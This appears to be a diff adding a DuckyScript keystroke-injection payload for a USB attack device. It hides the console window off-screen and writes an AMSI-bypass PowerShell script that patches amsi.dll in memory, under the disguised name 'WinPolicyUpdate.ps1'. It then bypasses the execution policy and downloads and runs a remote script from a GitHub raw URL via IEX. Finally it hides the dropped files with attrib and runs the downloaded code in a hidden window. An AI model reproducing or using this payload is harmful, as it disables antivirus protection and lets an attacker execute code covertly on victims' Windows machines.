@@ -1,0 +1,266 @@
+DELAY 8000
+GUI r
+DELAY 300
+ALT SPACE
+DELAY 200
+STRING m
+DELAY 200
+DOWN
+REPEAT 65
+DELAY 200
+ENTER
+DELAY 250
+STRING cmd /K "mode con: cols=25 lines=15"
+DELAY 250
+ENTER
+DELAY 150
+ALT SPACE
+DELAY 250
+STRING m
+DELAY 200
+DOWN
+REPEAT 200
+DELAY 300
+ENTER
+DELAY 350
+ENTER
+DELAY 300
+STRING copy /Y con %USERPROFILE%\Documents\WinPolicyUpdate.ps1
+DELAY 300
+ENTER
+DELAY 150
+STRING Write-Host "-- AMSI Patch"
+ENTER
+DELAY 50
+STRING Write-Host "-- Paul Laine (@am0nsec)"
+ENTER
+DELAY 50
+STRING Write-Host ""
+ENTER
+DELAY 50
+STRING $Kernel32 = @"
+ENTER
+DELAY 50
+STRING using System;
+ENTER
+DELAY 50
+STRING using System.Runtime.InteropServices;
+ENTER
+DELAY 50
+STRING public class Kernel32 {
+ENTER
+DELAY 50
+STRING [DllImport("kernel32")]
+ENTER
+DELAY 50
+STRING public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+ENTER
+STRING [DllImport("kernel32")]
+ENTER
+DELAY 50
+STRING public static extern IntPtr LoadLibrary(string lpLibFileName);
+ENTER
+STRING [DllImport("kernel32")]
+ENTER
+DELAY 50
+STRING public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+ENTER
+DELAY 50
+STRING }
+ENTER
+STRING "@
+ENTER
+STRING Add-Type $Kernel32
+ENTER
+STRING Class Hunter {
+ENTER
+STRING static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
+ENTER
+STRING while ($true) {
+ENTER
+STRING [int]$count = 0
+ENTER
+STRING while ($true) {
+ENTER
+STRING [IntPtr]$address = [IntPtr]::Add($address, 1)
+ENTER
+DELAY 50
+STRING If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
+ENTER
+DELAY 50
+STRING $count++
+ENTER
+STRING If ($count -eq $egg.Length) {
+ENTER
+STRING return [IntPtr]::Subtract($address, $egg.Length - 1)
+ENTER
+STRING }
+ENTER
+DELAY 50
+STRING } Else { break }
+ENTER
+STRING }
+ENTER
+STRING }
+ENTER
+STRING return $address
+ENTER
+STRING }
+ENTER
+STRING }
+ENTER
+STRING [IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
+ENTER
+DELAY 50
+STRING Write-Host "[+] AMSI DLL Handle: $hModule"
+ENTER
+DELAY 50
+STRING [IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
+ENTER
+STRING Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"
+ENTER
+STRING If ([IntPtr]::Size -eq 8) {
+ENTER
+STRING Write-Host "[+] 64-bits process"
+ENTER
+STRING [byte[]]$egg = [byte[]] (
+ENTER
+DELAY 50
+STRING 0x4C, 0x8B, 0xDC,       # mov     r11,rsp
+ENTER
+DELAY 50
+STRING 0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
+ENTER
+DELAY 50
+STRING 0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
+ENTER
+DELAY 50
+STRING 0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
+ENTER
+STRING 0x57,                   # push    rdi
+ENTER
+STRING 0x41, 0x56,             # push    r14
+ENTER
+STRING 0x41, 0x57,             # push    r15
+ENTER
+STRING 0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
+ENTER
+STRING )
+ENTER
+STRING } Else {
+ENTER
+STRING Write-Host "[+] 32-bits process"
+ENTER
+DELAY 50
+STRING [byte[]]$egg = [byte[]] (
+ENTER
+STRING 0x8B, 0xFF,             # mov     edi,edi
+ENTER
+STRING 0x55,                   # push    ebp
+ENTER
+STRING 0x8B, 0xEC,             # mov     ebp,esp
+ENTER
+STRING 0x83, 0xEC, 0x18,       # sub     esp,18h
+ENTER
+STRING 0x53,                   # push    ebx
+ENTER
+STRING 0x56                    # push    esi
+ENTER
+STRING )
+ENTER
+STRING }
+ENTER
+STRING [IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
+ENTER
+DELAY 50
+STRING Write-Host "[+] Targeted address: $targetedAddress"
+ENTER
+STRING $oldProtectionBuffer = 0
+ENTER
+STRING [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null
+ENTER
+DELAY 50
+STRING $patch = [byte[]] (
+ENTER
+STRING 0x31, 0xC0,    # xor rax, rax
+ENTER
+DELAY 50
+STRING 0xC3           # ret  
+ENTER
+STRING )
+ENTER
+STRING [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)
+ENTER
+DELAY 50
+STRING $a = 0
+ENTER
+STRING [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+CTRL z
+DELAY 500
+ENTER
+DELAY 500
+STRING copy /Y con %USERPROFILE%\Documents\WinSupportUpdate.ps1
+DELAY 50 
+ENTER
+DELAY 100
+STRING set-executionpolicy -executionpolicy bypass -scope currentuser -force
+DELAY 50
+ENTER
+DELAY 50
+STRING cd $env:userprofile\documents
+DELAY 100
+ENTER
+DELAY 100
+STRING .\winpolicyupdate.ps1
+DELAY 100
+ENTER
+DELAY 100
+STRING IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/boomer/master/WinLive10.ps1')
+DELAY 100
+ENTER
+DELAY 150
+ENTER
+CTRL z
+DELAY 350
+ENTER
+DELAY 350
+STRING cd %USERPROFILE%\Documents
+DELAY 150
+ENTER
+DELAY 200
+STRING attrib +h winpolicyupdate.ps1
+DELAY 150
+ENTER
+DELAY 100
+STRING attrib +h WinSupportUpdate.ps1
+DELAY 100
+ENTER
+DELAY 250
+STRING powershell -ep bypass
+DELAY 400
+ENTER
+DELAY 250
+STRING cd $env:userprofile\documents
+DELAY 250
+ENTER
+DELAY 250
+STRING .\WinPolicyUpdate.ps1
+DELAY 300
+ENTER
+DELAY 5000
+STRING start-process -filepath powershell -windowstyle hidden -argumentlist '.\WinSupportUpdate.ps1'
+DELAY 500
+ENTER
+DELAY 8000
+ENTER
+DELAY 150
+STRING exit
+DELAY 150
+ENTER
+DELAY 150
+ALT F4
+
